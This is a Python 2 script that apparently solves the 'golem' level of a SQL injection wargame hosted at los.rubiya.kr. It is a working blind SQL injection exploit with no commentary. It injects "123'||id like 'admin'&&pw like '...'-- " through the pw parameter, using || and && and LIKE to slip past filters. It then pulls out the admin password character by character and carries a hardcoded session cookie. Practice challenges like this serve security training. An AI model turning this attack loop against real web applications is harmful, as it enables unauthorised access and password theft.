#!/usr/bin/env python

import urllib
import urllib2

URL = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
UA =  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
Cookie = "PHPSESSID=9i2i63lhcv8dc6ge2k4pbijlgm"


def query(Q):
    UURL = URL + "?pw=" + urllib.quote(Q)
    req = urllib2.Request(UURL, {}, {
        'User-Agent': UA,
        'Cookie': Cookie
    })

    res = urllib2.urlopen(req)

    return "<h2>Hello admin</h2>" in res.read()

password = ""
guess_table = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_'

def guess(pattern):
    return query("123'||id like 'admin'&&pw like '{}'-- ".format(pattern))
while True:
    for ch in guess_table:
        if guess(password + ch + "%"):
            password += ch
            print password
            break